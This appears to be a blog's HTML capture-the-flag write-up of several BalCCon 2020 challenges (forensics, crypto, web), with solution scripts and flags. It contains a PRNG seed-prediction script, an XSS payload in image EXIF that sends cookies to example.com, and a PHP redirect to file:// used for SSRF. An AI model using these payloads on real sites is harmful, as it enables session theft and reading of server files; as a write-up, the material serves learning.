@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>BalCCon 2k20 CTF Write Up - AJDIN</title><link rel="icon" type="image/png" href=favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="BalCCon 2k20 CTF Write Up" />
+<meta property="og:description" content="This is a BalCCon 2k20 Write Up by imm0rtals
+forensics/Patience  Strange&hellip; Everything looks the same. But there is some message hidden, I am sure!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ajdin.io/posts/ctf-balccon-2020/" />
+<meta property="article:published_time" content="2020-09-26T19:17:05+02:00" />
+<meta property="article:modified_time" content="2020-09-26T19:17:05+02:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="BalCCon 2k20 CTF Write Up"/>
+<meta name="twitter:description" content="This is a BalCCon 2k20 Write Up by imm0rtals
+forensics/Patience  Strange&hellip; Everything looks the same. But there is some message hidden, I am sure!"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/main.css" /><link rel="stylesheet" type="text/css" href="https://ajdin.io/css/dark.css"  />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="https://ajdin.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://ajdin.io/">
+	<h1 class="site-title"><a href="https://ajdin.io/">AJDIN</a></h1>
+	<div class="site-description"><h2>welcome to ajdin.io</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">Archive</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">BalCCon 2k20 CTF Write Up</h1>
+			<div class="meta">Posted at &mdash; Sep 26, 2020</div>
+		</div>
+
+		<div class="markdown">
+			<p><img src="/ctf-balccon-2020/6.png" alt="">
+This is a BalCCon 2k20 Write Up by imm0rtals</p>
+<h2 id="forensicspatience">forensics/Patience</h2>
+<blockquote>
+<p>Strange&hellip; Everything looks the same. But there is some message hidden, I am sure!</p>
+</blockquote>
+<p>We are given a .pcap file and if we look at the duration
+<img src="/ctf-balccon-2020/7.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> durs:
+<span style="color:#f92672">...</span>     <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.20</span>:
+<span style="color:#f92672">...</span>             morse <span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;.&#39;</span>
+<span style="color:#f92672">...</span>     <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.5</span> <span style="color:#f92672">and</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>:
+<span style="color:#f92672">...</span>             morse <span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;-&#39;</span>
+<span style="color:#f92672">...</span>     <span style="color:#66d9ef">else</span>:
+<span style="color:#f92672">...</span>             morse <span style="color:#f92672">+=</span><span style="color:#e6db74">&#39; &#39;</span>
+<span style="color:#f92672">...</span> 
+<span style="color:#f92672">&gt;&gt;&gt;</span> morse
+<span style="color:#e6db74">&#39;-... -.-. - ..-.  -.-. --- ...- . .-. -  - .. -- .. -. --.  -.-. .... .- -. -. . .-..  .- - - .- -.-. -.-  .- -  -.. .- .-- -.  .&#39;</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{COVERT_TIMING_CHANNEL_ATTACK_AT_DAWN}
+</code></pre></div><hr>
+<h2 id="welcomemy-glass-is-empty">welcome/My glass is empty?</h2>
+<blockquote>
+<p>Let&rsquo;s change that and hang out with us in IRC :)</p>
+</blockquote>
+<p>Connect to #balccon2k20-ctf IRC and get the flag</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{pour_me_one_more_rakija}
+</code></pre></div><hr>
+<h2 id="cryptoslang-back">crypto/Slang Back</h2>
+<blockquote>
+<p>These youngsters speak some weird language. Does it make any sense at all?!</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">}ejnsergazaku_ejnevazakilu_ejndejazanu_ejnibazou_ib_ejnizaztovu_ejnumazekizu_zeb{ejnbazftcu
+</code></pre></div><p>Reverse it</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">uctfzabnje{bez_uzikezamunje_uvotzazinje_bi_uozabinje_unazajednje_ulikazavenje_ukazagresnje}
+</code></pre></div><p>Remove &ldquo;u&rdquo;, &ldquo;za&rdquo; and &ldquo;nje&rdquo;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctfb{bez_zikemu_votzi_bi_obi_najed_likave_kagres}
+</code></pre></div><p>Move some letters arround to create proper Serbian words (Remember this CTF was hosted in Serbia?):</p>
+<ul>
+<li>ctfb -&gt; bctf</li>
+<li>zikemu -&gt; muzike (music)</li>
+<li>votzi -&gt; zivot (life)</li>
+<li>obi -&gt; bio (would be)</li>
+<li>najed -&gt; jedna (one)</li>
+<li>likave -&gt; velika (big)</li>
+<li>kagres -&gt; greska (mistake)</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{bez_muzike_zivot_bi_bio_jedna_velika_greska}
+</code></pre></div><p>Which translates to:</p>
+<blockquote>
+<p>Without music life would be one big mistake</p>
+</blockquote>
+<hr>
+<h2 id="cryptotwice-cooler">crypto/Twice Cooler</h2>
+<blockquote>
+<p>We received the message which resembles some very familiar encoding&hellip; But not exactly it.</p>
+</blockquote>
+<p>The message has almost 40000 characters, just base32 decode over and over and you get:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{base32_is_c00ler_than_base64_s0meh0w}
+</code></pre></div><hr>
+<h2 id="webnavajo">web/Navajo</h2>
+<blockquote>
+<p>What is the status of Navajo tribes nowadays?</p>
+</blockquote>
+<p>Open <code>https://navajo.pwn.institute/server-status</code> and check logs (note: you might have to wait if the log request is not there)</p>
+<p><img src="/ctf-balccon-2020/1.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{extremely_secret_url_no_one_can_guess}
+</code></pre></div><hr>
+<h2 id="webtwo-sides-of-a-coin">web/Two Sides of a Coin</h2>
+<blockquote>
+<p>Bulletin Board where you can buy or sell cool stuff. Check it out: <a href="https://two-sides-of-a-coin.pwn.institute">https://two-sides-of-a-coin.pwn.institute</a></p>
+</blockquote>
+<p>CTF challege provides us with app.py:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> datetime
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> random
+<span style="color:#f92672">import</span> time
+
+<span style="color:#f92672">import</span> sqlite3
+
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, redirect, render_template, request, url_for
+
+READONLY <span style="color:#f92672">=</span> False
+<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#39;READONLY&#39;</span>):
+    READONLY <span style="color:#f92672">=</span> bool(os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#39;READONLY&#39;</span>))
+
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    conn <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;board.db&#39;</span>)
+    c <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
+    c<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;SELECT id_viewer, title FROM board&#39;</span>)
+
+    data <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> c<span style="color:#f92672">.</span>fetchall():
+        data<span style="color:#f92672">.</span>append({
+            <span style="color:#e6db74">&#39;id&#39;</span>: item[<span style="color:#ae81ff">0</span>],
+            <span style="color:#e6db74">&#39;title&#39;</span>: item[<span style="color:#ae81ff">1</span>],
+        })
+    conn<span style="color:#f92672">.</span>close()
+
+    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, data<span style="color:#f92672">=</span>data, readonly<span style="color:#f92672">=</span>READONLY)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_random_id</span>():
+    alphabet <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits)
+
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([random<span style="color:#f92672">.</span>choice(alphabet) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>)])
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/add&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>():
+    <span style="color:#66d9ef">if</span> READONLY:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Sorry, new advertisements are temporarily not allowed.&#39;</span>
+
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;add.html&#39;</span>)
+
+    posted_at <span style="color:#f92672">=</span> round(time<span style="color:#f92672">.</span>time(), <span style="color:#ae81ff">4</span>)
+    random<span style="color:#f92672">.</span>seed(posted_at)
+    id_viewer <span style="color:#f92672">=</span> get_random_id()
+    id_editor <span style="color:#f92672">=</span> get_random_id()
+
+    conn <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;board.db&#39;</span>)
+    c <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
+    params <span style="color:#f92672">=</span> (id_viewer, id_editor, posted_at, request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;title&#39;</span>], request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;text&#39;</span>], request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;text_extra&#39;</span>])
+    c<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;INSERT INTO board VALUES (?, ?, ?, ?, ?, ?)&#39;</span>, params)
+    conn<span style="color:#f92672">.</span>commit()
+    conn<span style="color:#f92672">.</span>close()
+
+    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/view/&#39;</span> <span style="color:#f92672">+</span> id_editor)
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/view/&lt;_id&gt;&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(_id):
+    conn <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;board.db&#39;</span>)
+    c <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
+    params <span style="color:#f92672">=</span> (_id, _id)
+    c<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;SELECT id_viewer, id_editor, posted_at, title, text_viewer, text_editor FROM board WHERE id_viewer = ? OR id_editor = ? LIMIT 1&#39;</span>, params)
+    data <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>fetchone()
+
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Advertisement not found.&#39;</span>, <span style="color:#ae81ff">404</span>
+
+    <span style="color:#75715e"># extra notes for editor</span>
+    is_editor <span style="color:#f92672">=</span> (data[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> _id)
+    text_extra <span style="color:#f92672">=</span> None
+    url_viewer <span style="color:#f92672">=</span> None
+
+    <span style="color:#66d9ef">if</span> is_editor:
+        text_extra <span style="color:#f92672">=</span> data[<span style="color:#ae81ff">5</span>]
+        url_viewer <span style="color:#f92672">=</span> url_for(<span style="color:#e6db74">&#39;view&#39;</span>, _id<span style="color:#f92672">=</span>data[<span style="color:#ae81ff">0</span>])
+
+    data <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;posted_at&#39;</span>: datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>fromtimestamp(data[<span style="color:#ae81ff">2</span>], tz<span style="color:#f92672">=</span>datetime<span style="color:#f92672">.</span>timezone<span style="color:#f92672">.</span>utc)<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#39;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M UTC&#39;</span>),
+        <span style="color:#e6db74">&#39;title&#39;</span>: data[<span style="color:#ae81ff">3</span>],
+        <span style="color:#e6db74">&#39;text&#39;</span>: data[<span style="color:#ae81ff">4</span>],
+        <span style="color:#e6db74">&#39;text_extra&#39;</span>: text_extra,
+        <span style="color:#e6db74">&#39;url_viewer&#39;</span>: url_viewer,
+    }
+    conn<span style="color:#f92672">.</span>close()
+
+    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;view.html&#39;</span>, data<span style="color:#f92672">=</span>data)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5002</span>)
+
+</code></pre></div><p>The random number generation in not actually random. The script which extracts the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> time
+<span style="color:#f92672">import</span> calendar
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> argparse
+<span style="color:#f92672">import</span> bs4
+<span style="color:#f92672">import</span> itertools
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_random_id</span>():
+    alphabet <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits)
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([random<span style="color:#f92672">.</span>choice(alphabet) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>)])
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">frange</span>(start,stop,step):
+  <span style="color:#66d9ef">if</span> step <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Step must not be 0&#34;</span>)
+  sample_count <span style="color:#f92672">=</span> int(abs(stop<span style="color:#f92672">-</span>start) <span style="color:#f92672">/</span> step)
+  <span style="color:#66d9ef">return</span> itertools<span style="color:#f92672">.</span>islice(itertools<span style="color:#f92672">.</span>count(start,step),sample_count)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_id</span>(view_id):
+  r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;view/&#34;</span> <span style="color:#f92672">+</span> view_id) 
+  soup <span style="color:#f92672">=</span> bs4<span style="color:#f92672">.</span>BeautifulSoup(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
+  tm <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>font<span style="color:#f92672">.</span>text[<span style="color:#ae81ff">10</span>:]
+  t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>strptime(tm,<span style="color:#e6db74">&#34;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M %Z&#34;</span>)
+  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> frange(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">0.0001</span>):
+    time_value <span style="color:#f92672">=</span> round(calendar<span style="color:#f92672">.</span>timegm(t),<span style="color:#ae81ff">4</span>)<span style="color:#f92672">+</span>i
+    random<span style="color:#f92672">.</span>seed(time_value)
+    test_seed_id <span style="color:#f92672">=</span> get_random_id()
+    <span style="color:#66d9ef">if</span> test_seed_id <span style="color:#f92672">==</span> view_id:
+      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Viewing id found at {:04f}&#39;s past time : {}&#34;</span><span style="color:#f92672">.</span>format(i,test_seed_id))
+      editing_id <span style="color:#f92672">=</span> get_random_id()
+      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Editing id found : {}&#34;</span><span style="color:#f92672">.</span>format(editing_id))
+      r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;view/&#34;</span> <span style="color:#f92672">+</span> editing_id)
+      soup <span style="color:#f92672">=</span> bs4<span style="color:#f92672">.</span>BeautifulSoup(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
+      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Title: {}&#34;</span><span style="color:#f92672">.</span>format(soup<span style="color:#f92672">.</span>h1<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>rstrip()))
+      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Regular viewing: {}&#34;</span><span style="color:#f92672">.</span>format(soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;p&#39;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>rstrip()))
+      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Editorial viewing: {}&#34;</span><span style="color:#f92672">.</span>format(soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;p&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>rstrip()))
+      <span style="color:#66d9ef">break</span>
+
+
+parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Solve bulletin board challenge&#39;</span>)
+parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--host&#39;</span>)
+args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+
+host <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>host
+r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(host)
+bs <span style="color:#f92672">=</span> bs4<span style="color:#f92672">.</span>BeautifulSoup(r<span style="color:#f92672">.</span>text,<span style="color:#e6db74">&#39;html.parser&#39;</span>)
+<span style="color:#66d9ef">for</span> viewing_id <span style="color:#f92672">in</span> bs<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;a&#39;</span>):
+  check_id(viewing_id[<span style="color:#e6db74">&#39;href&#39;</span>][<span style="color:#ae81ff">6</span>:])
+</code></pre></div><p>And the flag is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{numb3rs_from_PRNG_are_n0t_really_rand0m}
+</code></pre></div><hr>
+<h2 id="webimgr">web/Imgr</h2>
+<blockquote>
+<p>Look at this nice new Social Media application. You can only view your own profile, since it is still in the very early development phase, but it is the up and coming social networking platform. P.S. If you see something strange, let developers know! <a href="https://imgr.pwn.institute">https://imgr.pwn.institute</a></p>
+</blockquote>
+<p><img src="/ctf-balccon-2020/2.png" alt=""></p>
+<p>After creating an account and logging in we can see an endpoint in the source code called <code>/imageinfo</code></p>
+<p><img src="/ctf-balccon-2020/3.png" alt=""></p>
+<p>Editing the picture exif data we can inject XSS and send that url to the devs.</p>
+<p>XSS payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;new Image().src=&#39;https://example.com/?c=%27+document.cookie&lt;/script&gt;
+</code></pre></div><p>Flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">flag=BCTF{n3v3r_pUbl15h_Unf1n15h3d_p4ge5}
+</code></pre></div><hr>
+<h2 id="weblet-me-see">web/Let Me See</h2>
+<blockquote>
+<p>This service lets you see the source code of your website: <a href="https://let-me-see.pwn.institute">https://let-me-see.pwn.institute</a></p>
+</blockquote>
+<p><img src="/ctf-balccon-2020/4.png" alt=""></p>
+<p>This is a SSRF challenge, host this file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php
+header(&#34;Location: file://flag.txt&#34;);
+?&gt;
+</code></pre></div><p>and open it with the app:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{tricky_curl_redirect_to_file_protocol}
+</code></pre></div>
+		</div>
+
+		<div class="post-tags">
+			
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © All rights reserved |  <a href="https://github.com/vividvilla/ezhil">Ezhil theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+
+<script>feather.replace()</script>
+</body>
+</html>
